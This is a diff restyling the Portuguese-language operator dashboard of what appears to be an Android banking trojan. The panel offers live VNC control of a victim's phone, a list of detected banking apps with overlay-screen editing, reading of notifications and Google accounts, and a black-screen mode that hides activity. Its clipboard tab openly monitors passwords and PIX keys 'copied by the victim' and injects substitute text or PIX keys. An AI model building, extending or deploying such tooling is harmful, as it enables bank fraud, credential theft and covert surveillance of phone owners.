+            { label: ' Notifs', active: showNotificationsTab, action: () => { setShowNotificationsTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowAppsTab(false); setShowClipboardTab(false); fetchNotifications(); }},
             { label: ' Apps', active: showAppsTab, action: () => { setShowAppsTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowClipboardTab(false); fetchInstalledApps(); }},
           ].map((tab, i) => (
             <button
               key={i}
               onClick={tab.action}
-              className={`whitespace-nowrap px-3 py-1.5 rounded-xl text-xs font-bold border transition-all shrink-0 ${tab.active ? 'bg-cyan-500/20 border-cyan-500/60 text-cyan-300 shadow-[0_0_10px_rgba(255,43,43,0.2)]' : 'bg-slate-800/60 border-slate-700 text-slate-400'}`}
+              className={`whitespace-nowrap px-3 py-1.5 rounded-md text-xs font-bold border transition-all shrink-0 ${tab.active ? 'bg-[#ef4444]/20 border-[#2a2a31]/60 text-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'bg-[#24242a]/60 border-[#2a2a31] text-slate-400'}`}
             >
               {tab.label}
             </button>
@@ -4150,7 +4214,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* --- TELA VNC --- */}
           {!showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab && (
-            <div className="rounded-2xl overflow-hidden border border-cyan-500/40 shadow-[0_0_20px_rgba(255,43,43,0.1)] bg-black" style={{ minHeight: '55vw', maxHeight: '70vh' }}>
+            <div className="rounded-md overflow-hidden border border-[#2a2a31]/40 shadow-[0_0_20px_rgba(239,68,68,0.1)] bg-black" style={{ minHeight: '55vw', maxHeight: '70vh' }}>
               {isCaptureEnabled ? (
                 <DeviceScreen
                   deviceId={deviceId!}
@@ -4163,12 +4227,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 />
               ) : (
                 <div className="flex flex-col items-center justify-center h-64 gap-3">
-                  <div className="w-14 h-14 bg-cyan-500/10 rounded-full flex items-center justify-center border border-cyan-500/30">
-                    <span className="text-3xl">📷</span>
+                  <div className="w-14 h-14 bg-[#ef4444]/10 rounded-full flex items-center justify-center border border-[#2a2a31]/30">
+                    <span className="text-3xl"></span>
                   </div>
                   <p className="text-slate-400 text-sm font-mono">Captura de tela pausada</p>
-                  <button onClick={toggleCapture} className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 text-white rounded-xl text-sm font-bold shadow-[0_0_15px_rgba(255,43,43,0.3)]">
-                    –¶ Iniciar Captura
+                  <button onClick={toggleCapture} className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] rounded-md text-sm font-bold shadow-[0_0_15px_rgba(239,68,68,0.3)]">
+                    ¶ Iniciar Captura
                   </button>
                 </div>
               )}
@@ -4178,7 +4242,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           {/* --- TELA V2 --- */}
           {showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab && (
             <div
-              className="rounded-2xl overflow-hidden border border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.1)] bg-[#120303]"
+              className="rounded-md overflow-hidden border border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.1)] bg-[#120303]"
               style={{ minHeight: '55vw', maxHeight: '70vh' }}
               onTouchStart={(e) => {
                 const touch = e.touches[0];
@@ -4254,24 +4318,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           {/* --- ABA BANCOS --- */}
           {showBankMonitorTab && (
             <div className="space-y-3">
-              <div className="bg-[#380d04]/95 rounded-2xl border border-orange-500/30 p-3">
-                <h3 className="text-sm font-black text-orange-300 mb-3 font-mono uppercase flex items-center gap-2"> Bancos Detectados ({installedBanks.length})</h3>
+              <div className="bg-[#380d04]/95 rounded-md border border-[#ef4444]/30 p-3">
+                <h3 className="text-sm font-black text-[#fca5a5] mb-3 font-mono uppercase flex items-center gap-2"> Bancos Detectados ({installedBanks.length})</h3>
                 {installedBanks.length === 0 ? (
-                  <p className="text-slate-500 text-xs text-center py-4 font-mono">Nenhum banco detectado. Atualize a lista de apps.</p>
+                  <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Nenhum banco detectado. Atualize a lista de apps.</p>
                 ) : (
                   <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                     {installedBanks.map((bank, i) => (
-                      <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-xl border border-orange-500/20">
+                      <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-md border border-[#ef4444]/20">
                         <div className="flex items-center gap-2 min-w-0">
                           <BankIcon pkg={bank.package} iconB64={bank.icon || bank.iconB64} name={bank.name} size={32} />
                           <div className="min-w-0">
                             <p className="text-white text-xs font-bold truncate max-w-[140px]">{bank.name}</p>
-                            <p className="text-slate-500 text-[9px] font-mono truncate max-w-[140px]">{bank.package}</p>
+                            <p className="text-[#8b8b94] text-[9px] font-mono truncate max-w-[140px]">{bank.package}</p>
                           </div>
                         </div>
                         <div className="flex gap-1.5 shrink-0">
-                          <button onClick={() => openApp(bank.package, bank.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-lg text-[10px] font-bold cursor-pointer">–¶</button>
-                          <button onClick={() => { setEditBankPackage(bank.package); setEditBankLogoText(bank.name); setShowEditBankScreensTab(true); setShowBankMonitorTab(false); }} className="px-2 py-1 bg-pink-700/80 text-white rounded-lg text-[10px] font-bold cursor-pointer">💉</button>
+                          <button onClick={() => openApp(bank.package, bank.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-md text-[10px] font-bold cursor-pointer">¶</button>
+                          <button onClick={() => { setEditBankPackage(bank.package); setEditBankLogoText(bank.name); setShowEditBankScreensTab(true); setShowBankMonitorTab(false); }} className="px-2 py-1 bg-[#4d7c0f]/80 text-white rounded-md text-[10px] font-bold cursor-pointer"></button>
                         </div>
                       </div>
                     ))}
@@ -4283,17 +4347,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* --- ABA NOTIFICAÇÕES --- */}
           {showNotificationsTab && (
-            <div className="bg-[#380d04]/95 rounded-2xl border border-purple-500/30 p-3">
-              <h3 className="text-sm font-black text-purple-300 mb-3 font-mono uppercase flex items-center gap-2"><Bell className="w-4 h-4" /> Notificações ({notifications.length})</h3>
+            <div className="bg-[#380d04]/95 rounded-md border border-[#f87171]/30 p-3">
+              <h3 className="text-sm font-black text-[#fca5a5] mb-3 font-mono uppercase flex items-center gap-2"><Bell className="w-4 h-4" /> Notificações ({notifications.length})</h3>
               {notifications.length === 0 ? (
-                <p className="text-slate-500 text-xs text-center py-4 font-mono">Sem notificações recentes.</p>
+                <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Sem notificações recentes.</p>
               ) : (
                 <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                   {notifications.slice(0, 30).map((n: any, i) => (
-                    <div key={i} className="bg-[#280903] p-2.5 rounded-xl border border-purple-500/20">
+                    <div key={i} className="bg-[#280903] p-2.5 rounded-md border border-[#f87171]/20">
                       <div className="flex items-center gap-2 mb-1">
-                        <span className="text-[10px] font-bold text-purple-300 font-mono truncate">{n.appName || n.package}</span>
-                        <span className="text-[9px] text-slate-500 ml-auto">{n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ''}</span>
+                        <span className="text-[10px] font-bold text-[#fca5a5] font-mono truncate">{n.appName || n.package}</span>
+                        <span className="text-[9px] text-[#8b8b94] ml-auto">{n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ''}</span>
                       </div>
                       <p className="text-white text-xs break-all">{n.title && <strong>{n.title}: </strong>}{n.text}</p>
                     </div>
@@ -4305,25 +4369,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* --- ABA APPS --- */}
           {showAppsTab && (
-            <div className="bg-[#380d04]/95 rounded-2xl border border-emerald-500/30 p-3">
+            <div className="bg-[#380d04]/95 rounded-md border border-emerald-500/30 p-3">
               <div className="flex items-center justify-between mb-3">
                 <h3 className="text-sm font-black text-emerald-300 font-mono uppercase flex items-center gap-2"><Smartphone className="w-4 h-4" /> Apps ({installedApps.length})</h3>
-                <button onClick={fetchInstalledApps} className="px-2 py-1 bg-emerald-800/60 border border-emerald-500/40 rounded-lg text-[10px] text-emerald-300 font-bold cursor-pointer">🔄 Atualizar</button>
+                <button onClick={fetchInstalledApps} className="px-2 py-1 bg-emerald-800/60 border border-emerald-500/40 rounded-md text-[10px] text-emerald-300 font-bold cursor-pointer"> Atualizar</button>
               </div>
               {installedApps.length === 0 ? (
-                <p className="text-slate-500 text-xs text-center py-4 font-mono">Sem apps. Toque em Atualizar.</p>
+                <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Sem apps. Toque em Atualizar.</p>
               ) : (
                 <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                   {installedApps.slice(0, 50).map((app, i) => (
-                    <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-xl border border-emerald-500/20">
+                    <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-md border border-emerald-500/20">
                       <div className="flex items-center gap-2 min-w-0">
                         <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64} name={app.name} size={30} />
                         <div className="min-w-0">
                           <p className="text-white text-xs font-bold truncate max-w-[140px]">{app.name}</p>
-                          <p className="text-slate-500 text-[9px] font-mono truncate max-w-[140px]">{app.package}</p>
+                          <p className="text-[#8b8b94] text-[9px] font-mono truncate max-w-[140px]">{app.package}</p>
                         </div>
                       </div>
-                      <button onClick={() => openApp(app.package, app.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-lg text-[10px] font-bold cursor-pointer shrink-0">–¶ Abrir</button>
+                      <button onClick={() => openApp(app.package, app.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-md text-[10px] font-bold cursor-pointer shrink-0">¶ Abrir</button>
                     </div>
                   ))}
                 </div>
@@ -4333,11 +4397,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* --- ABA CONTAS GOOGLE --- */}
           {showGoogleAccountsTab && (
-            <div className="bg-[#380d04]/95 rounded-2xl border border-amber-500/40 p-4 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
+            <div className="bg-[#380d04]/95 rounded-md border border-amber-500/40 p-4 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
               <div className="flex items-center justify-between mb-4">
                 <div>
                   <h3 className="text-sm font-black text-amber-300 font-mono uppercase flex items-center gap-2">
-                    <span>📧</span> Contas Google no Aparelho ({device?.accounts?.length || 0})
+                    <span></span> Contas Google no Aparelho ({device?.accounts?.length || 0})
                   </h3>
                   <p className="text-slate-400 text-[11px] font-mono mt-0.5">
                     Contas registradas e vinculadas aos serviços Google neste dispositivo.
@@ -4347,31 +4411,31 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   onClick={() => {
                     sendCommand({ action: 'GET_DEVICE_INFO' });
                   }} 
-                  className="px-3 py-1.5 bg-amber-900/60 hover:bg-amber-800/80 border border-amber-500/50 rounded-xl text-xs text-amber-300 font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(245,158,11,0.2)]"
+                  className="px-3 py-1.5 bg-amber-900/60 hover:bg-amber-800/80 border border-amber-500/50 rounded-md text-xs text-amber-300 font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(245,158,11,0.2)]"
                 >
                   <RefreshCw className="w-3.5 h-3.5" /> Atualizar
                 </button>
               </div>
 
               {(!device?.accounts || device.accounts.length === 0) ? (
-                <div className="text-center py-8 bg-[#280903] border border-dashed border-amber-500/30 rounded-xl p-4">
-                  <span className="text-4xl block mb-2 opacity-60">📧</span>
+                <div className="text-center py-8 bg-[#280903] border border-dashed border-amber-500/30 rounded-md p-4">
+                  <span className="text-4xl block mb-2 opacity-60"></span>
                   <p className="text-slate-300 text-xs font-bold font-mono">Nenhuma conta Google retornada ainda</p>
-                  <p className="text-slate-500 text-[10px] font-mono mt-1 max-w-sm mx-auto">
+                  <p className="text-[#8b8b94] text-[10px] font-mono mt-1 max-w-sm mx-auto">
                     Toque em Atualizar para solicitar as contas ao dispositivo ou garanta que o serviço de acessibilidade/admin esteja ativo.
                   </p>
                 </div>
               ) : (
                 <div className="space-y-3 max-h-[60vh] overflow-y-auto pr-1">
                   {device.accounts.map((acc: string, i: number) => (
-                    <div key={i} className="flex items-center justify-between bg-[#280903] p-3 rounded-xl border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md">
+                    <div key={i} className="flex items-center justify-between bg-[#280903] p-3 rounded-md border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md">
                       <div className="flex items-center gap-3 min-w-0">
-                        <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-amber-500/20 to-orange-600/30 border border-amber-500/40 flex items-center justify-center shrink-0">
-                          <span className="text-base">📧</span>
+                        <div className="w-9 h-9 rounded-md bg-gradient-to-br from-amber-500/20 to-[#84cc16]/30 border border-amber-500/40 flex items-center justify-center shrink-0">
+                          <span className="text-base"></span>
                         </div>
                         <div className="min-w-0">
                           <p className="text-amber-200 text-xs font-black font-mono truncate">{acc}</p>
-                          <p className="text-slate-500 text-[10px] font-mono">Conta Google / Sync Android</p>
+                          <p className="text-[#8b8b94] text-[10px] font-mono">Conta Google / Sync Android</p>
                         </div>
                       </div>
                       <button
@@ -4379,7 +4443,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           navigator.clipboard.writeText(acc);
                           alert(`Conta ${acc} copiada para a área de transferência!`);
                         }}
-                        className="px-3 py-1.5 bg-amber-950/90 hover:bg-amber-900 border border-amber-500/50 text-amber-300 rounded-lg text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
+                        className="px-3 py-1.5 bg-amber-950/90 hover:bg-amber-900 border border-amber-500/50 text-amber-300 rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                       >
                         <Copy className="w-3.5 h-3.5" /> Copiar
                       </button>
@@ -4392,11 +4456,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* --- ABA CLIPBOARD (REA DE TRANSFERŠNCIA) --- */}
           {showClipboardTab && (
-            <div className="bg-[#380d04]/95 rounded-2xl border border-cyan-500/40 p-4 shadow-[0_0_20px_rgba(239,68,68,0.15)] space-y-4">
+            <div className="bg-[#380d04]/95 rounded-md border border-[#2a2a31]/40 p-4 shadow-[0_0_20px_rgba(239,68,68,0.15)] space-y-4">
               <div className="flex items-center justify-between">
                 <div>
-                  <h3 className="text-sm font-black text-cyan-300 font-mono uppercase flex items-center gap-2">
-                    <span>“‹</span> rea de Transferência (Clipboard Sincronizado)
+                  <h3 className="text-sm font-black text-[#ef4444] font-mono uppercase flex items-center gap-2">
+                    <span></span> rea de Transferência (Clipboard Sincronizado)
                   </h3>
                   <p className="text-slate-400 text-[11px] font-mono mt-0.5">
                     Monitoramento em tempo real de textos, senhas e PIX copiados pela vítima.
@@ -4405,16 +4469,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 <button 
                   onClick={fetchClipboard} 
                   disabled={isLoadingClipboard}
-                  className="px-3 py-1.5 bg-cyan-950/80 hover:bg-cyan-900 border border-cyan-500/50 rounded-xl text-xs text-cyan-300 font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(239,68,68,0.2)]"
+                  className="px-3 py-1.5 bg-[#121214]/80 hover:bg-[#1a1a1e] border border-[#2a2a31]/50 rounded-md text-xs text-[#ef4444] font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(239,68,68,0.2)]"
                 >
                   <RefreshCw className={`w-3.5 h-3.5 ${isLoadingClipboard ? 'animate-spin' : ''}`} /> Atualizar
                 </button>
               </div>
 
               {/* Form de Injeção de Texto no Clipboard */}
-              <form onSubmit={handleInjectClipboard} className="bg-[#240703] p-3.5 rounded-xl border border-cyan-500/30 space-y-2">
-                <label className="text-[11px] font-bold text-cyan-300 uppercase tracking-wider block font-mono">
-                  ⚡ Injetar Texto no Clipboard do Aparelho:
+              <form onSubmit={handleInjectClipboard} className="bg-[#240703] p-3.5 rounded-md border border-[#2a2a31]/30 space-y-2">
+                <label className="text-[11px] font-bold text-[#ef4444] uppercase tracking-wider block font-mono">
+                   Injetar Texto no Clipboard do Aparelho:
                 </label>
                 <div className="flex gap-2">
                   <input
@@ -4422,25 +4486,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     value={clipboardInputText}
                     onChange={(e) => setClipboardInputText(e.target.value)}
                     placeholder="Digite o texto, chave PIX ou senha para injetar no celular..."
-                    className="flex-1 bg-[#120303] border border-cyan-500/40 rounded-xl px-3 py-2 text-xs text-white placeholder-slate-500 font-mono focus:outline-none focus:border-cyan-400"
+                    className="flex-1 bg-[#120303] border border-[#2a2a31]/40 rounded-md px-3 py-2 text-xs text-white placeholder-[#8b8b94] font-mono focus:outline-none focus:border-[#3a3a44]"
                   />
                   <button
                     type="submit"
-                    className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white rounded-xl text-xs font-bold font-mono shadow-[0_0_12px_rgba(239,68,68,0.3)] shrink-0 cursor-pointer"
+                    className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold font-mono shadow-[0_0_12px_rgba(239,68,68,0.3)] shrink-0 cursor-pointer"
                   >
-                    Enviar 🚀
+                    Enviar 
                   </button>
                 </div>
               </form>
 
               {/* Clipboard Atual em Destaque */}
               {clipboardData.current && (
-                <div className="bg-gradient-to-r from-amber-950/60 to-amber-900/40 p-3.5 rounded-xl border border-amber-500/50 shadow-lg">
+                <div className="bg-gradient-to-r from-amber-950/60 to-amber-900/40 p-3.5 rounded-md border border-amber-500/50 shadow-lg">
                   <span className="text-[10px] font-black text-amber-400 uppercase tracking-wider block font-mono mb-1">
-                    📌 CLIPBOARD ATUALMENTE ATIVO NO CELULAR:
+                     CLIPBOARD ATUALMENTE ATIVO NO CELULAR:
                   </span>
                   <div className="flex items-center justify-between gap-3">
-                    <p className="text-amber-100 font-mono font-bold text-xs break-all bg-amber-950/80 p-2 rounded-lg border border-amber-500/30 flex-1">
+                    <p className="text-amber-100 font-mono font-bold text-xs break-all bg-amber-950/80 p-2 rounded-md border border-amber-500/30 flex-1">
                       {clipboardData.current}
                     </p>
                     <button
@@ -4448,7 +4512,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         navigator.clipboard.writeText(clipboardData.current!);
                         alert('Texto copiado com sucesso!');
                       }}
-                      className="px-3 py-2 bg-amber-900 hover:bg-amber-800 border border-amber-400 text-amber-200 rounded-lg text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
+                      className="px-3 py-2 bg-amber-900 hover:bg-amber-800 border border-amber-400 text-amber-200 rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                     >
                       <Copy className="w-3.5 h-3.5" /> Copiar
                     </button>
@@ -4459,20 +4523,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               {/* Histórico do Clipboard */}
               <div>
                 <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono mb-2">
-                  📜 Histórico de Textos Copiados ({clipboardData.history.length})
+                   Histórico de Textos Copiados ({clipboardData.history.length})
                 </h4>
                 {clipboardData.history.length === 0 ? (
-                  <div className="text-center py-6 bg-[#280903] border border-dashed border-cyan-500/20 rounded-xl">
-                    <span className="text-3xl block mb-2 opacity-50">📋</span>
+                  <div className="text-center py-6 bg-[#280903] border border-dashed border-[#2a2a31]/20 rounded-md">
+                    <span className="text-3xl block mb-2 opacity-50"></span>
                     <p className="text-slate-400 text-xs font-mono">Nenhum texto copiado capturado ainda.</p>
                   </div>
                 ) : (
                   <div className="space-y-2 max-h-[50vh] overflow-y-auto pr-1">
                     {clipboardData.history.map((item) => (
-                      <div key={item.id} className="flex items-center justify-between bg-[#280903] p-3 rounded-xl border border-cyan-500/20 hover:border-cyan-400/40 transition-all">
+                      <div key={item.id} className="flex items-center justify-between bg-[#280903] p-3 rounded-md border border-[#2a2a31]/20 hover:border-[#3a3a44]/40 transition-all">
                         <div className="min-w-0 flex-1 pr-3">
-                          <p className="text-cyan-200 text-xs font-mono font-bold break-all">{item.text}</p>
-                          <p className="text-slate-500 text-[9px] font-mono mt-0.5">
+                          <p className="text-[#e8e8ea] text-xs font-mono font-bold break-all">{item.text}</p>
+                          <p className="text-[#8b8b94] text-[9px] font-mono mt-0.5">
                             {new Date(item.timestamp).toLocaleString('pt-BR')}
                           </p>
                         </div>
@@ -4481,7 +4545,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             navigator.clipboard.writeText(item.text);
                             alert('Texto copiado!');
                           }}
-                          className="px-2.5 py-1.5 bg-cyan-950 hover:bg-cyan-900 border border-cyan-500/40 text-cyan-300 rounded-lg text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
+                          className="px-2.5 py-1.5 bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/40 text-[#ef4444] rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                         >
                           <Copy className="w-3 h-3" /> Copiar
                         </button>
@@ -4495,28 +4559,28 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
 
         {/* ===== BARRA DE CONTROLES FIXOS NO FUNDO ===== */}
-        <div className="fixed bottom-0 left-0 right-0 z-20 bg-[#220603]/98 backdrop-blur-xl border-t border-cyan-500/30 px-3 py-2 shadow-[0_-4px_20px_rgba(0,0,0,0.6)]">
+        <div className="fixed bottom-0 left-0 right-0 z-20 bg-[#220603]/98 backdrop-blur-xl border-t border-[#2a2a31]/30 px-3 py-2 shadow-[0_-4px_20px_rgba(0,0,0,0.6)]">
           {/* Navegação Android */}
           <div className="grid grid-cols-5 gap-1.5 mb-2">
-            <button onClick={() => sendCommand({ action: 'BACK' })} className="py-2.5 bg-slate-800 hover:bg-slate-700 active:bg-slate-600 text-white rounded-xl text-base font-bold border border-slate-700 transition-all">◀</button>
-            <button onClick={() => sendCommand({ action: 'HOME' })} className="py-2.5 bg-slate-800 hover:bg-slate-700 active:bg-slate-600 text-white rounded-xl text-base font-bold border border-slate-700 transition-all">—</button>
-            <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-2.5 bg-slate-800 hover:bg-slate-700 active:bg-slate-600 text-white rounded-xl text-base font-bold border border-slate-700 transition-all">■</button>
+            <button onClick={() => sendCommand({ action: 'BACK' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
+            <button onClick={() => sendCommand({ action: 'HOME' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
+            <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
             <button
               onClick={toggleCapture}
-              className={`py-2 rounded-xl text-[10px] font-bold border transition-all ${isCaptureEnabled ? 'bg-green-700/80 border-green-500/50 text-green-100' : 'bg-slate-800 border-slate-700 text-slate-300'}`}
+              className={`py-2 rounded-md text-[10px] font-bold border transition-all ${isCaptureEnabled ? 'bg-green-700/80 border-green-500/50 text-green-100' : 'bg-[#24242a] border-[#2a2a31] text-slate-300'}`}
             >
-              {isCaptureEnabled ? '”´ VNC' : '–¶ VNC'}
+              {isCaptureEnabled ? '´ VNC' : '¶ VNC'}
             </button>
-            <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2.5 bg-red-700/80 hover:bg-red-600 text-white rounded-xl text-base font-bold border border-red-500/50 transition-all">»</button>
+            <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2.5 bg-[#ef4444]/80 hover:bg-[#ef4444] text-white rounded-md text-base font-bold border border-[#2a2a31]/50 transition-all">»</button>
           </div>
           {/* Ações Extras */}
           <div className="grid grid-cols-4 gap-1.5">
-            <button onClick={toggleBlackScreen} className={`py-2 rounded-xl text-[10px] font-bold border transition-all ${isBlackScreen ? 'bg-black border-white/40 text-white' : 'bg-slate-800 border-slate-700 text-slate-300'}`}>
-              {isBlackScreen ? '⬛ Preta' : '⬜ Preta'}
+            <button onClick={toggleBlackScreen} className={`py-2 rounded-md text-[10px] font-bold border transition-all ${isBlackScreen ? 'bg-black border-white/40 text-white' : 'bg-[#24242a] border-[#2a2a31] text-slate-300'}`}>
+              {isBlackScreen ? ' Preta' : ' Preta'}
             </button>
-            <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-slate-800 border border-slate-700 text-slate-300 rounded-xl text-[10px] font-bold">🔔 Notif</button>
-            <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-slate-800 border border-slate-700 text-slate-300 rounded-xl text-[10px] font-bold">š™ Config</button>
-            <button onClick={() => setIsMobileFullscreen(true)} className="py-2 bg-blue-700/80 border border-blue-500/50 text-blue-100 rounded-xl text-[10px] font-bold">⛶ Full</button>
+            <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-[#24242a] border border-[#2a2a31] text-slate-300 rounded-md text-[10px] font-bold"> Notif</button>
+            <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-[#24242a] border border-[#2a2a31] text-slate-300 rounded-md text-[10px] font-bold">š Config</button>
+            <button onClick={() => setIsMobileFullscreen(true)} className="py-2 bg-[#ef4444]/80 border border-[#2a2a31]/50 text-[#e8e8ea] rounded-md text-[10px] font-bold"> Full</button>
           </div>
         </div>
 
@@ -4525,57 +4589,57 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   }
 
   // ============================================
-  // –¥ RENDERIZA‡ƒO DESKTOP - ORIGINAL
+  // ¥ RENDERIZAƒO DESKTOP - ORIGINAL
   // ============================================
   return (
-    <div className="min-h-screen bg-[#0a0404]/35 backdrop-blur-[1px] text-slate-100 relative overflow-x-hidden">
+    <div className="min-h-screen bg-[#0a0a0b] text-slate-100 relative overflow-x-hidden">
       {/* BANNER FLUTUANTE DE NOTIFICAÇO DE DUPLICAÇO */}
       {duplicationBanner && (
-        <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[99999] px-6 py-3 bg-slate-900/95 border-2 border-cyan-400 text-cyan-300 rounded-2xl shadow-[0_0_40px_rgba(255,43,43,0.7)] backdrop-blur-xl flex items-center gap-3 animate-bounce">
-          <span className="text-2xl">🔒</span>
+        <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[99999] px-6 py-3 bg-[#121214]/95 border-2 border-[#3a3a44] text-[#ef4444] rounded-md shadow-[0_0_40px_rgba(239,68,68,0.7)] backdrop-blur-xl flex items-center gap-3 animate-bounce">
+          <span className="text-2xl"></span>
           <span className="font-bold text-sm tracking-wide font-mono">{duplicationBanner}</span>
         </div>
       )}
 
       {/* Dynamic Cyber HUD Ambient Lights */}
-      <div className="absolute top-0 left-1/4 w-[700px] h-[400px] bg-cyan-500/10 blur-[180px] pointer-events-none rounded-full" />
-      <div className="absolute top-1/3 right-5 w-[600px] h-[400px] bg-purple-600/10 blur-[180px] pointer-events-none rounded-full" />
+      <div className="absolute top-0 left-1/4 w-[700px] h-[400px] bg-[#ef4444]/10 blur-[180px] pointer-events-none rounded-full" />
+      <div className="absolute top-1/3 right-5 w-[600px] h-[400px] bg-[#84cc16]/10 blur-[180px] pointer-events-none rounded-full" />
       <div className="absolute bottom-10 left-10 w-[500px] h-[300px] bg-emerald-500/10 blur-[180px] pointer-events-none rounded-full" />
 
       {/* OVERLAY DE DISPOSITIVO DESÍCONECTADO */}
       {!device.is_online && !device.has_screen && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-[100]">
-          <div className="text-center p-8 hud-glass-card rounded-2xl border-2 border-red-500/80 max-w-md mx-4 shadow-[0_0_50px_rgba(239,68,68,0.35)]">
-            <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500/40 animate-pulse">
-              <span className="text-5xl">📵</span>
+          <div className="text-center p-8 hud-glass-card rounded-md border-2 border-[#2a2a31]/80 max-w-md mx-4 shadow-[0_0_50px_rgba(239,68,68,0.35)]">
+            <div className="w-20 h-20 bg-[#ef4444]/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-[#2a2a31]/40 animate-pulse">
+              <span className="text-5xl"></span>
             </div>
-            <h2 className="text-2xl font-black text-red-400 mb-2 uppercase tracking-wider font-mono">Dispositivo Offline</h2>
+            <h2 className="text-2xl font-black text-[#ef4444] mb-2 uppercase tracking-wider font-mono">Dispositivo Offline</h2>
             <p className="text-slate-300 mb-6 text-xs leading-relaxed font-mono">
               A íconexão remota foi interrompida ou o aparelho não está emitindo telemetria VNC.
             </p>
             <button
               onClick={() => navigate('/dashboard')}
-              className="w-full py-3 bg-gradient-to-r from-red-600 via-rose-600 to-red-700 hover:from-red-500 hover:to-rose-500 text-white rounded-xl font-black uppercase tracking-widest text-xs shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-all transform hover:-translate-y-0.5"
